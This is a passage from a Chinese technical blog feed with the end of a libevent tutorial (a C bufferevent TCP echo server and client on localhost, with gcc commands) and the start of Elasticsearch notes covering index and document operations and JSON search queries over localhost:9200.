class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;event2/event.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;event2/listener.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;event2/bufferevent.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//读缓冲区回调</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">read_cb</span><span class="params">(struct bufferevent *bev,<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">1024</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">bufferevent_read(bev,buf,<span class="keyword">sizeof</span>(buf));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"client say : %s\n"</span>,buf);</span><br><span class="line"><span class="keyword">char</span> *p = <span class="string">"我是服务器，已经成功收到你发送的数据！"</span>;</span><br><span class="line">bufferevent_write(bev,p,<span class="built_in">strlen</span>(p)+<span class="number">1</span>);</span><br><span class="line">sleep(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//写缓冲区回调</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">write_cb</span><span class="params">(struct bufferevent *bev,<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"我是服务器的写回调函数...\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//事件回调</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">event_cb</span><span class="params">(struct bufferevent *bev,short events,<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (events &amp; BEV_EVENT_EOF)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"connection close\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(events &amp; BEV_EVENT_ERROR)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"some other error\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line">bufferevent_free(bev);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"buffevent资源已经被释放...\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//监听回调</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">cb_listener</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">struct evconnlistener *listener,</span></span></span><br><span class="line"><span class="function"><span class="params"><span class="keyword">evutil_socket_t</span> fd,</span></span></span><br><span class="line"><span class="function"><span class="params">struct sockaddr *addr,</span></span></span><br><span class="line"><span class="function"><span class="params"><span class="keyword">int</span> len,<span class="keyword">void</span> *ptr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"connect new client\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">event_base</span> *<span class="title">base</span> = (<span class="title">struct</span> <span class="title">event_base</span>*)<span class="title">ptr</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//添加新事件</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bufferevent</span> *<span class="title">bev</span>;</span></span><br><span class="line">bev = bufferevent_socket_new(base,fd,BEV_OPT_CLOSE_ON_FREE);</span><br><span class="line"></span><br><span class="line"><span class="comment">//给bufferevent缓冲区设置回调</span></span><br><span class="line">bufferevent_setcb(bev,read_cb,write_cb,event_cb,<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//启用bufferevent的读缓冲</span></span><br><span class="line">bufferevent_enable(bev,EV_READ);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">const</span> <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">serv</span>;</span></span><br><span class="line"><span class="built_in">memset</span>(&amp;serv,<span class="number">0</span>,<span class="keyword">sizeof</span>(serv));</span><br><span class="line">serv.sin_family = AF_INET;</span><br><span class="line">serv.sin_port = htons(<span class="number">9527</span>);</span><br><span class="line">serv.sin_addr.s_addr = htonl(INADDR_ANY);</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建event_base</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">event_base</span> *<span class="title">base</span>;</span></span><br><span class="line">base = event_base_new();</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">evconnlistener</span> *<span class="title">listener</span>;</span> <span class="comment">//监听器</span></span><br><span class="line"><span class="comment">//创建套接字，绑定，接收连接请求</span></span><br><span class="line">listener = evconnlistener_new_bind(base,cb_listener,base,LEV_OPT_CLOSE_ON_FREE | LEV_OPT_REUSEABLE,<span class="number">36</span>,(struct sockaddr*)&amp;serv,<span class="keyword">sizeof</span>(serv));</span><br><span class="line"></span><br><span class="line">event_base_dispatch(base);</span><br><span class="line">evconnlistener_free(listener);</span><br><span class="line">event_base_free(base);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc ev_server.c -o ev_server -l event</span><br></pre></td></tr></table></figure><h4 id="客户端bufferevent创建TCP连接流程"><a href="#客户端bufferevent创建TCP连接流程" class="headerlink" title="客户端bufferevent创建TCP连接流程"></a>客户端bufferevent创建TCP连接流程</h4><ul><li>创建<code>event_base</code></li><li>使用<code>bufferevent_socket_new()</code>创建一个用于跟服务器通信的<code>bufferevent</code>事件对象</li><li>使用<code>bufferevent_socket_connect()</code>连接服务器</li><li>使用<code>bufferevent_setcb()</code>给<code>bufferevent</code>对象的<code>read、write、event</code>设置回调</li><li>设置<code>bufferevent</code>对象的读写缓冲区<code>enable/disable</code></li><li>接受、发送数据<code>bufferevent_read()/bufferevent_write()</code></li><li>启动循环监听<code>event_base_dispatch()</code></li><li>释放资源</li></ul><h4 id="客户端bufferevent实现"><a href="#客户端bufferevent实现" class="headerlink" title="客户端bufferevent实现"></a>客户端bufferevent实现</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;event2/bufferevent.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;event2/event.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//读缓冲区回调</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">read_cb</span><span class="params">(struct bufferevent *bev,<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">1024</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">bufferevent_read(bev,buf,<span class="keyword">sizeof</span>(buf));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"server say : %s\n"</span>,buf);</span><br><span class="line">bufferevent_write(bev,buf,<span class="built_in">strlen</span>(buf)+<span class="number">1</span>);</span><br><span class="line">sleep(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">write_cb</span><span class="params">(struct bufferevent *bev,<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"我是客户端的写回调函数....\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//事件回调</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">event_cb</span><span class="params">(struct bufferevent *bev,short events,<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (events &amp; BEV_EVENT_EOF)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"connection close\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(events &amp; BEV_EVENT_ERROR)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"some other error\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(events &amp; BEV_EVENT_CONNECTED)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"已经成功连接到服务器\n"</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">bufferevent_free(bev);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"buffevent资源已经被释放...\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">read_terminal</span><span class="params">(<span class="keyword">evutil_socket_t</span> fd,short what,<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">1024</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> len = read(fd,buf,<span class="keyword">sizeof</span>(buf));</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bufferevent</span> *<span class="title">bev</span> = (<span class="title">struct</span> <span class="title">bufferevent</span>*)<span class="title">arg</span>;</span></span><br><span class="line"><span class="comment">//发送数据</span></span><br><span class="line">bufferevent_write(bev,buf,len+<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">event_base</span> *<span class="title">base</span> = <span class="title">NULL</span>;</span></span><br><span class="line">base = event_base_new();</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> fd = socket(AF_INET,SOCK_STREAM,<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//通信的fd放在bufferevent中</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bufferevent</span> *<span class="title">bev</span> = <span class="title">NULL</span>;</span></span><br><span class="line">bev = bufferevent_socket_new(base,fd,BEV_OPT_CLOSE_ON_FREE);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">serv</span>;</span></span><br><span class="line"><span class="built_in">memset</span>(&amp;serv,<span class="number">0</span>,<span class="keyword">sizeof</span>(serv));</span><br><span class="line">serv.sin_family = AF_INET;</span><br><span class="line">serv.sin_port = htons(<span class="number">9527</span>);</span><br><span class="line">inet_pton(AF_INET,<span class="string">"127.0.0.1"</span>,&amp;serv.sin_addr.s_addr);</span><br><span class="line"></span><br><span class="line"><span class="comment">//连接服务器</span></span><br><span class="line">bufferevent_socket_connect(bev,(struct sockaddr*)&amp;serv,<span class="keyword">sizeof</span>(serv));</span><br><span class="line"></span><br><span class="line"><span class="comment">//设置回调</span></span><br><span class="line">bufferevent_setcb(bev,read_cb,write_cb,event_cb,<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//设置读回调生效</span></span><br><span class="line"><span class="comment">//bufferevent_enable(bev,EV_READ);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//创建事件，监听用户在终端上的输入</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">event</span>* <span class="title">ev</span> = <span class="title">event_new</span>(<span class="title">base</span>,<span class="title">STDIN_FILENO</span>,<span class="title">EV_READ</span>|<span class="title">EV_PERSIST</span>,<span class="title">read_terminal</span>,<span class="title">bev</span>);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//添加事件</span></span><br><span class="line">event_add(ev,<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">event_base_dispatch(base);</span><br><span class="line">event_free(ev);</span><br><span class="line">event_base_free(base);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc ev_client.c -o ev_client -l event</span><br></pre></td></tr></table></figure><h4 id="服务端客户端测试"><a href="#服务端客户端测试" class="headerlink" title="服务端客户端测试"></a>服务端客户端测试</h4><p><img src="/2021/11/19/浅学libevent/7.png" alt="7"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;libevent简介&quot;&gt;&lt;a href=&quot;#libevent简介&quot; class=&quot;headerlink&quot; title=&quot;libevent简介&quot;&gt;&lt;/a&gt;libevent简介&lt;/h4&gt;&lt;p&gt;&lt;code&gt;libevent&lt;/code&gt;是一个用C语言编写的轻量级的开源高
      
    
    </summary>
    
    
      <category term="Notes" scheme="elssm.github.io/tags/Notes/"/>
    
  </entry>
  
  <entry>
    <title>Elasticsearch笔记</title>
    <link href="elssm.github.io/2021/11/16/Elasticsearch%E7%AC%94%E8%AE%B0/"/>
    <id>elssm.github.io/2021/11/16/Elasticsearch笔记/</id>
    <published>2021-11-16T06:29:54.000Z</published>
    <updated>2021-12-13T09:45:04.378Z</updated>
    
    <content type="html"><![CDATA[<h4 id="ElasticSearch简介"><a href="#ElasticSearch简介" class="headerlink" title="ElasticSearch简介"></a>ElasticSearch简介</h4><p>Elasticsearch是一个基于Lucene的搜索服务器。它提供了一个分布式多用户能力的全文搜索引擎，基于RESTful web接口。Elasticsearch是用Java语言开发的，并作为Apache许可条款下的开放源码发布，是一种流行的企业级搜索引擎。Elasticsearch用于云计算中，能够达到实时搜索，稳定，可靠，快速，安装使用方便。官方客户端在Java、.NET（C#）、PHP、Python、Apache Groovy、Ruby和许多其他语言中都是可用的。根据DB-Engines的排名显示，Elasticsearch是最受欢迎的企业搜索引擎，其次是Apache Solr，也是基于Lucene。</p><h4 id="ElasticSearch对比MySQL"><a href="#ElasticSearch对比MySQL" class="headerlink" title="ElasticSearch对比MySQL"></a>ElasticSearch对比MySQL</h4><div class="table-container"><table><thead><tr><th>ELasticSearch</th><th>MySQL</th></tr></thead><tbody><tr><td>index</td><td>database</td></tr><tr><td>type</td><td>table</td></tr><tr><td>document</td><td>row</td></tr><tr><td>field</td><td>column</td></tr></tbody></table></div><h4 id="RESTful"><a href="#RESTful" class="headerlink" title="RESTful"></a>RESTful</h4><p>RESTful中文意思是表现层状态转化。</p><p>在RESTful架构中：每一个URI代表一种资源；客户端和服务器之间，传递这种资源的某种表现层；客户端通过四个HTTP动词，对服务器端资源进行操作，实现”表现层状态转化”。通过URI指定资源，如<code>Index，Document</code>等。通过<code>Http Method</code>指明资源操作类型，如<code>GET POST PUT DELETE</code>等。</p><h4 id="索引创建"><a href="#索引创建" class="headerlink" title="索引创建"></a>索引创建</h4><p>使用postman工具创建一个名为<code>shopping</code>的索引，请求方式为<code>PUT</code></p><p><img src="/2021/11/16/Elasticsearch笔记/1.png" alt="1"></p><h4 id="索引查询"><a href="#索引查询" class="headerlink" title="索引查询"></a>索引查询</h4><h5 id="获取单个索引信息"><a href="#获取单个索引信息" class="headerlink" title="获取单个索引信息"></a>获取单个索引信息</h5><p><img src="/2021/11/16/Elasticsearch笔记/2.png" alt="2"></p><h5 id="获取全部索引信息"><a href="#获取全部索引信息" class="headerlink" title="获取全部索引信息"></a>获取全部索引信息</h5><p>请求地址后面添加<code>_cat/indices?v</code></p><p><img src="/2021/11/16/Elasticsearch笔记/3.png" alt="3"></p><h4 id="索引删除"><a href="#索引删除" class="headerlink" title="索引删除"></a>索引删除</h4><p>删除名为<code>shopping</code>的索引，请求方式为<code>DELETE</code></p><p><img src="/2021/11/16/Elasticsearch笔记/4.png" alt="4"></p><h4 id="创建文档"><a href="#创建文档" class="headerlink" title="创建文档"></a>创建文档</h4><p>请求方式为<code>POST</code>，请求地址为<code>http://localhost:9200/索引名/_doc</code>，请求体为<code>JSON</code>格式</p><p><img src="/2021/11/16/Elasticsearch笔记/5.png" alt="5"></p><p>由于ES自动生成的<code>id</code>不便于记忆，因此我们可以自定义id，只需要在<code>_doc</code>后写入自定义的id即可</p><p><img src="/2021/11/16/Elasticsearch笔记/6.png" alt="6"></p><h4 id="查询文档"><a href="#查询文档" class="headerlink" title="查询文档"></a>查询文档</h4><p>只需要将创建文档的请求方式改为<code>GET</code>即可，其中<code>_doc</code>后面的<code>1001</code>相当于主键</p><p><img src="/2021/11/16/Elasticsearch笔记/7.png" alt="7"></p><p>获取索引下的所有数据，可以在请求的索引后加<code>_search</code></p><p><img src="/2021/11/16/Elasticsearch笔记/8.png" alt="8"></p><h4 id="修改索引下的数据"><a href="#修改索引下的数据" class="headerlink" title="修改索引下的数据"></a>修改索引下的数据</h4><h5 id="全量更新"><a href="#全量更新" class="headerlink" title="全量更新"></a>全量更新</h5><p>因为全量更新的请求是满足幂等条件的，因此请求方式为<code>PUT</code>，将需要修改的内容以<code>JSON</code>格式写入请求体</p><p><img src="/2021/11/16/Elasticsearch笔记/9.png" alt="9"></p><h5 id="局部更新"><a href="#局部更新" class="headerlink" title="局部更新"></a>局部更新</h5><p>局部更新的请求不满足幂等条件，因此请求方式为<code>POST</code>，而且因为是局部更新，因此索引名后面要写<code>_update</code>而不能写<code>_doc</code></p><p><img src="/2021/11/16/Elasticsearch笔记/10.png" alt="10"></p><h4 id="删除数据"><a href="#删除数据" class="headerlink" title="删除数据"></a>删除数据</h4><p>资源地址和创建时是一样的，请求方式变为<code>DELETE</code></p><p><img src="/2021/11/16/Elasticsearch笔记/11.png" alt="11"></p><h4 id="条件查询"><a href="#条件查询" class="headerlink" title="条件查询"></a>条件查询</h4><h5 id="请求路径查询"><a href="#请求路径查询" class="headerlink" title="请求路径查询"></a>请求路径查询</h5><p>请求方式为<code>GET</code>，请求路径为<code>http://localhost:9200/shopping/_search?q=category:iphone13</code></p><p>该请求路径表示查询shopping索引下<code>category=iphone13</code>的所有结果</p><p><img src="/2021/11/16/Elasticsearch笔记/12.png" alt="12"></p><h5 id="请求体查询"><a href="#请求体查询" class="headerlink" title="请求体查询"></a>请求体查询</h5><p>请求体查询在请求路径只需要输入<code>http://localhost:9200/shopping/_search</code>，在请求体中添加<code>JSON</code>查询请求如下</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"query"</span>:&#123;</span><br><span class="line">        <span class="attr">"match"</span>:&#123;</span><br><span class="line">            <span class="attr">"category"</span>:<span class="string">"iphone13"</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2021/11/16/Elasticsearch笔记/13.png" alt="13"></p><p>如果要全量查询，只需要将请求体中的<code>match</code>改为<code>match_all</code>即可</p><h4 id="分页查询"><a href="#分页查询" class="headerlink" title="分页查询"></a>分页查询</h4><p>全量查询的话数据量会很大，因此我们可以采用分页查询</p><p>请求体中添加<code>JSON</code>如下，其中<code>from</code>表示从哪一页开始，0表示第一页。size表示页的大小，即每一页有多少条数据。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"query"</span>:&#123;</span><br><span class="line">        <span class="attr">"match_all"</span>:&#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">"from"</span> : <span class="number">0</span>,</span><br><span class="line">    <span class="attr">"size"</span>: <span class="number">2</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2021/11/16/Elasticsearch笔记/14.png" alt="14"></p><h4 id="查询结果数据源控制"><a href="#查询结果数据源控制" class="headerlink" title="查询结果数据源控制"></a>查询结果数据源控制</h4><p>在请求体中添加<code>JSON</code>请求查询如下，其中<code>_source</code>表示所要展示的数据源，这里我们设置只显示<code>title</code>字段</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"query"</span>:&#123;</span><br><span class="line">        <span class="attr">"match_all"</span>:&#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">"from"</span> : <span class="number">0</span>,</span><br><span class="line">    <span class="attr">"size"</span>: <span class="number">2</span>,</span><br><span class="line">  <span class="attr">"_source"</span> : [<span class="string">"title"</span>]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2021/11/16/Elasticsearch笔记/15.png" alt="15"></p><h4 id="查询结果排序"><a href="#查询结果排序" class="headerlink" title="查询结果排序"></a>查询结果排序</h4><p>在请求体中添加<code>JSON</code>请求查询如下，其中<code>sort</code>表示所要要对数据进行排序，这里我们设置按照价格进行降序排序，</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"query"</span>:&#123;</span><br><span class="line">        <span class="attr">"match_all"</span>:&#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">"from"</span> : <span class="number">0</span>,</span><br><span class="line">    <span class="attr">"size"</span>: <span class="number">2</span>,</span><br><span class="line">    <span class="attr">"_source"</span> : [<span class="string">"title"</span>],</span><br><span class="line">    <span class="attr">"sort"</span> : &#123;</span><br><span class="line">        <span class="attr">"price"</span> : &#123;</span><br><span class="line">            <span class="attr">"order"</span> : <span class="string">"desc"</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2021/11/16/Elasticsearch笔记/16.png" alt="16"></p><h4 id="多条件查询"><a href="#多条件查询" class="headerlink" title="多条件查询"></a>多条件查询</h4><h5 id="多条件同时成立"><a href="#多条件同时成立" class="headerlink" title="多条件同时成立"></a>多条件同时成立</h5><p>请求体如下，其中<code>bool</code>代表条件查询，<code>must</code>表示多个条件必须同时成立</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"query"</span>:&#123;</span><br><span class="line">        <span class="attr">"bool"</span> : &#123;</span><br><span class="line">            <span class="attr">"must"</span> : [</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="attr">"match"</span> :&#123;</span><br><span class="line">                        <span class="attr">"category"</span>:<span class="string">"iphone13"</span></span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;,</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="attr">"match"</span> :&#123;</span><br><span class="line">                        <span class="attr">"price"</span>:<span class="string">"7999"</span></span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            ]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2021/11/16/Elasticsearch笔记/17.png" alt="17"></p><h5 